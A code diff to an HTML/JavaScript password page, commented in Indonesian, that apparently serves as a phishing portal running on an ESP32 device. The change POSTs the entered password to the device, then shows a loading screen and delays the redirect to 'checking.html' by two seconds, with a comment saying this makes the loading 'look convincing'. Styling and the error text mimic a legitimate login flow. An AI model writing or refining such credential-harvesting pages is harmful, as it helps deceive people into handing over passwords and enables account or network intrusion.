@@ -135,11 +135,11 @@
             z-index: 3;
             width: 36px;
             height: 36px;
-            background-color: transparent; /* Memastikan transparan */
+            background-color: transparent;
         }
         
         .toggle-password:hover {
-            background-color: transparent; /* Hover tetap transparan seperti request Anda */
+            background-color: transparent;
         }
 
         /* FITUR BARU: Animasi Coretan Ikon Mata SVG */
@@ -151,10 +151,9 @@
         .eye-slash-mask, .eye-slash-fg {
             stroke-dasharray: 25;
             stroke-dashoffset: 0;
-            transition: stroke-dashoffset 0.15s cubic-bezier(0.4, 0, 0.2, 1); /* Durasi dipercepat jadi 0.15s */
+            transition: stroke-dashoffset 0.15s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        /* Ketika class 'show-password' aktif, coretan akan menghilang/dihapus perlahan */
         .show-password .eye-slash-mask, 
         .show-password .eye-slash-fg {
             stroke-dashoffset: 25;
@@ -264,13 +263,10 @@
                                 <defs>
                                     <mask id="eye-mask">
                                         <rect width="24" height="24" fill="white" />
-                                        <!-- Garis ini menembus/menghapus bagian mata di bawah coretan -->
                                         <line x1="4" y1="4" x2="20" y2="20" stroke="black" stroke-width="3" stroke-linecap="round" class="eye-slash-mask" />
                                     </mask>
                                 </defs>
-                                <!-- Bentuk Mata (Warna Biru #1a73e8) -->
                                 <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#1a73e8" mask="url(#eye-mask)"/>
-                                <!-- Garis coretan yang bergerak (Warna Biru #1a73e8) -->
                                 <line x1="4" y1="4" x2="20" y2="20" stroke="#1a73e8" stroke-width="2" stroke-linecap="round" class="eye-slash-fg" />
                             </svg>
                         </div>
@@ -316,17 +312,16 @@
         const passwordInput = document.getElementById('password');
 
         togglePasswordBtn.addEventListener('click', function() {
-            // Cek kondisi saat ini, lalu ubah
             if (passwordInput.type === 'password') {
                 passwordInput.type = 'text';
-                this.classList.add('show-password'); // Menjalankan animasi hapus coretan
+                this.classList.add('show-password');
             } else {
                 passwordInput.type = 'password';
-                this.classList.remove('show-password'); // Menjalankan animasi buat coretan
+                this.classList.remove('show-password');
             }
         });
 
-        // SISA KODE ASLI DI BAWAH INI SAMA SEKALI TIDAK DIRUBAH
+        // KODE DIPERBAIKI PADA BAGIAN FETCH
         form.addEventListener('submit', function(e) {
             e.preventDefault();
             const password = passwordInput.value; 
@@ -336,6 +331,7 @@
                 return;
             }
 
+            // Tampilkan animasi loading
             submitBtn.disabled = true;
             formContainer.classList.add('hidden');
             checkingContainer.classList.remove('hidden');
@@ -346,15 +342,21 @@
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
                 body: 'password=' + encodeURIComponent(password)
-            }).catch(function(error) {
+            })
+            .then(function(response) {
+                // Perbaikan: Redirect hanya dieksekusi SETELAH data sukses terkirim ke ESP32
+                // Delay 2 detik ditambahkan agar efek loading terlihat meyakinkan
+                setTimeout(function() {
+                    window.location.href = 'checking.html';
+                }, 2000);
+            })
+            .catch(function(error) {
                 console.error('Error:', error);
                 formContainer.classList.remove('hidden');
                 checkingContainer.classList.add('hidden');
                 showError('Connection timeout. Retry.');
                 submitBtn.disabled = false;
             });
-
-            window.location.href = 'checking.html';
         });
 
         function showError(message) {
@@ -362,9 +364,6 @@
             errorMsg.classList.remove('hidden');
             setTimeout(() => errorMsg.classList.add('hidden'), 3000);
         }
-
-        const btn = document.getElementById('submit-btn');
-        if (btn) btn.textContent = 'Next';
     </script>
 </body>
 </html>
